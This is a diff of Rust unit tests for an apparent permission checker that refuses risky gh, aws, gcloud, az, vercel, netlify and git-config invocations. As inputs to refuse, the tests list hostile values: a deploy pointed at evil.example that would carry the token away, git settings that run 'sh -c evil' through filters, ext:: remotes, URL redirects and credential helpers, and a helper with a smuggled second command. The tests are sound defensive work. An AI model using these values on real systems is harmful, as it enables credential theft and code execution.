-            assert!(!refused("gh", line), "gh {line}");
-        }
-        // No subcommand, or a flag before it, is never an Always for all of gh.
-        for line in ["", "--repo=o/r pr merge", "-R o/r pr list", "My_Ext", "-- pr list"] {
-            assert!(refused("gh", line), "gh {line}");
-        }
         // aws reads its input from a file only with file://.
         assert!(refused("aws", "ec2 run-instances --cli-input-json file://x.json"));
         assert!(refused("aws", "ec2 run-instances --cli-input-yaml=fileb://x"));
         assert!(refused("aws", "configure set x y"));
-        assert!(refused("aws", "--profile work s3 ls"));
         assert!(!refused("aws", "ec2 run-instances --cli-input-json {}"));
         assert!(!refused("aws", "s3 ls --profile work"));
+        // No subcommand, or a flag before it, is never an Always for all of it.
+        for line in ["", "--profile work s3 ls", "-- s3 ls"] {
+            assert!(refused("aws", line), "aws {line}");
+        }
+        assert!(!refused("aws", "--version"));
         assert!(refused("gcloud", "run deploy --flags-file=f.yaml"));
+        assert!(refused("gcloud", "source repos clone r"));
+        assert!(refused("gcloud", "components install x"));
         assert!(!refused("gcloud", "run deploy --configuration work"));
         assert!(refused("az", "vm create @args.txt"));
+        assert!(refused("az", "extension add -n x"));
+        assert!(refused("az", "bicep install"));
+        assert!(refused("az", "repos pr checkout --id 1"));
+        assert!(refused("az", "acr login -n r"));
+        assert!(!refused("az", "acr list"));
+        assert!(refused("aws", "codeartifact login --tool npm"));
         assert!(!refused("az", "login --debug"));
-        for stem in ["vercel.cmd", "netlify", "wrangler"] {
-            for line in [
-                "deploy --local-config x",
-                "deploy -A x",
-                "deploy --global-config d",
-                "deploy --config x",
-                "deploy -c x",
-                "deploy -yc x",
-                "",
-                "--prod",
-            ] {
-                assert!(refused(stem, line), "{stem} {line}");
-            }
-            assert!(!refused(stem, "deploy --prod"), "{stem}");
-        }
-        // Another API host takes the token with it.
-        for line in [
-            "deploy --api https://evil.example",
-            "deploy --api=https://evil.example",
-            "deploy -Q d",
-            "deploy --cwd ../other",
-            "deploy --api-url x",
-            "deploy --base-url x",
-            "deploy --apiHost x",
-        ] {
-            assert!(refused("vercel", line), "vercel {line}");
-            assert!(refused("netlify", line), "netlify {line}");
-        }
-        // gh hands what follows `--` to git as flags.
-        assert!(refused("gh", "repo clone o/r -- --config core.hooksPath=x"));
-        assert!(refused("gh", "repo fork o/r --clone -- -c x=y"));
-        assert!(refused("gh", "repo clone o/r"));
-        assert!(refused("gh", "repo fork"));
-        assert!(!refused("gh", "repo view o/r"));
+        // A flag after `--` is an operand.
+        assert!(!refused("gcloud", "run deploy -- --flags-file=x"));
         // A program with no rules of its own is not refused here.
         assert!(!refused("curl", "-t x"));
         assert!(!refused("stripe", ""));
-    }
-
-    #[test]
-    fn git_versions_are_read() {
-        assert_eq!(git_version("git version 2.56.0.windows.4\n"), Some((2, 56)));
-        assert_eq!(git_version("git version 2.39.5"), Some((2, 39)));
-        assert_eq!(git_version("git version 2.40.rc1"), Some((2, 40)));
-        assert_eq!(git_version("git version x.1"), None);
-        assert_eq!(git_version("hub version 2.14"), None);
-        assert!(git_version("git version 2.40.0").unwrap() >= (2, 40));
-    }
-
-    #[test]
-    fn git_reads_extra_settings_as_it_expects_them() {
-        assert_eq!(
-            git_config_parameters(None, &[("core.hooksPath", "C:/h"), ("core.fsmonitor", "false")]),
-            "'core.hooksPath=C:/h' 'core.fsmonitor=false'"
-        );
-        assert_eq!(
-            git_config_parameters(Some(" 'a.b=1' "), &[("x.y", "it's")]),
-            r"'a.b=1' 'x.y=it'\''s'"
-        );
-    }
-
-    #[test]
-    fn a_git_config_names_its_includes_and_hooks() {
-        let text = "[core]\n\thooksPath = .githooks\n[include]\n\tpath = ~/extra.gitconfig\n[includeIf \"gitdir:C:/work/\"]\n  path = \"work.gitconfig\"\n# [include]\n; path = no\n[user]\n\tpath = not-an-include\n[Include] path = inline\n";
-        let refs = git_refs(text);
-        assert_eq!(refs.includes, ["~/extra.gitconfig", "work.gitconfig", "inline"]);
-        assert_eq!(refs.hooks_path.as_deref(), Some(".githooks"));
-        assert!(!refs.odd);
-        let shown: Vec<String> = refs.keys.iter().map(GitKey::shown).collect();
-        assert_eq!(
-            shown,
-            [
-                "core.hookspath",
-                "include.path",
-                "includeif.gitdir:C:/work/.path",
-                "user.path",
-                "include.path"
-            ]
-        );
-        assert_eq!(git_refs(""), GitRefs::default());
-        // Anything git could read otherwise than this does.
-        for odd in [
-            "[core]\n\thooksPath = a ; b\n",
-            "[core]\n\thooksPath = a # b\n",
-            "[include]\n\tpath = C:\\x\n",
-            "[include]\n\tpath = a\\\n",
-            "[include]\n\tpath = \"a\n",
-            "[core\n",
-            "[includeIf \"gitdir:x]\"]\n\tpath = y\n",
-        ] {
-            assert!(git_refs(odd).odd, "{odd}");
-        }
-        assert!(!git_refs("[alias]\n\tx = \"!echo a;b\"\n").odd, "quoted ; is a value");
-        // Escapes are read as git reads them.
-        let escaped = git_refs("[include]\n\tpath = \"C:\\\\a b\\\\c\"\n");
-        assert!(!escaped.odd);
-        assert_eq!(escaped.includes, [r"C:\a b\c"]);
-        // A byte order mark does not hide the first section.
-        assert_eq!(git_refs("\u{feff}[core]\n\thooksPath = h\n").hooks_path.as_deref(), Some("h"));
-    }
-
-    fn refused_keys(text: &str) -> Vec<String> {
-        git_refs(text).keys.iter().filter(|k| git_key_refused(k)).map(GitKey::shown).collect()
-    }
-
-    #[test]
-    fn only_git_settings_known_to_be_data_keep_always() {
-        let plain = "[core]\n\trepositoryformatversion = 0\n\tfilemode = false\n\tbare = false\n\tlogallrefupdates = true\n\tsymlinks = false\n\tignorecase = true\n\thooksPath = .husky\n\teditor = code --wait\n[remote \"origin\"]\n\turl = https://github.com/o/r.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch \"main\"]\n\tremote = origin\n\tmerge = refs/heads/main\n[user]\n\tname = A\n\temail = a@b.c\n[init]\n\tdefaultBranch = main\n[pull]\n\trebase = true\n[credential]\n\thelper = manager\n[credential \"https://github.com\"]\n\thelper =\n\thelper = !'C:\\\\Program Files\\\\GitHub CLI\\\\gh.exe' auth git-credential\n[alias]\n\tst = status\n[color]\n\tui = auto\n[commit]\n\tgpgsign = false\n[safe]\n\tdirectory = C:/x\n[http]\n\tsslbackend = schannel\n";
-        assert!(refused_keys(plain).is_empty(), "{:?}", refused_keys(plain));
-        for (text, key) in [
-            ("[filter \"x\"]\n\tclean = sh -c evil\n", "filter.x.clean"),
-            ("[filter \"x\"]\n\tprocess = evil\n", "filter.x.process"),
-            ("[core]\n\tsshCommand = evil\n", "core.sshcommand"),
-            ("[core]\n\tgitProxy = evil\n", "core.gitproxy"),
-            ("[diff \"x\"]\n\ttextconv = evil\n", "diff.x.textconv"),
-            ("[merge \"x\"]\n\tdriver = evil\n", "merge.x.driver"),
-            ("[credential]\n\thelper = !evil\n", "credential.helper"),
-            ("[credential]\n\thelper = store\n", "credential.helper"),
-            ("[credential]\n\thelper = !C:/x/evil.exe auth git-credential\n", "credential.helper"),
-            ("[url \"https://evil.example/\"]\n\tinsteadOf = https://github.com/\n", "url.https://evil.example/.insteadof"),
-            ("[http]\n\tproxy = http://evil\n", "http.proxy"),
-            ("[http]\n\tsslVerify = false\n", "http.sslverify"),
-            ("[http \"https://github.com\"]\n\textraHeader = x\n", "http.https://github.com.extraheader"),
-            ("[commit]\n\tgpgsign = true\n", "commit.gpgsign"),
-            ("[gpg]\n\tprogram = evil\n", "gpg.program"),
-            ("[submodule \"s\"]\n\tupdate = !evil\n", "submodule.s.update"),
-            ("[lfs]\n\turl = x\n", "lfs.url"),
-            ("[remote \"o\"]\n\turl = ext::sh -c evil\n", "remote.o.url"),
-            ("[remote \"o\"]\n\tuploadpack = evil\n", "remote.o.uploadpack"),
-            ("[protocol]\n\tallow = always\n", "protocol.allow"),
-            ("[core]\n\tfsmonitorHookVersion = 2\n", "core.fsmonitorhookversion"),
-        ] {
-            assert_eq!(refused_keys(text), [key], "{text}");
-        }
-        assert_eq!(gh_helper("!gh auth git-credential").as_deref(), Some("gh"));
-        assert_eq!(gh_helper("!/usr/bin/gh auth git-credential").as_deref(), Some("/usr/bin/gh"));
-        assert_eq!(gh_helper("!gh auth git-credential; evil"), None);
-        assert_eq!(gh_helper("!evil auth git-credential"), None);
     }
 
     const SHIM: &str = "@ECHO off\r\nGOTO start\r\n:find_dp0\r\nSET dp0=%~dp0\r\nEXIT /b\r\n:start\r\nSETLOCAL\r\nCALL :find_dp0\r\n\r\nIF EXIST \"%dp0%\\node.exe\" (\r\n  SET \"_prog=%dp0%\\node.exe\"\r\n) ELSE (\r\n  SET \"_prog=node\"\r\n  SET PATHEXT=%PATHEXT:;.JS;=;%\r\n)\r\n\r\nendLocal & goto #_undefined_# 2>NUL || title %COMSPEC% & \"%_prog%\"  \"%dp0%\\node_modules\\vercel\\dist\\index.js\" %*\r\n";
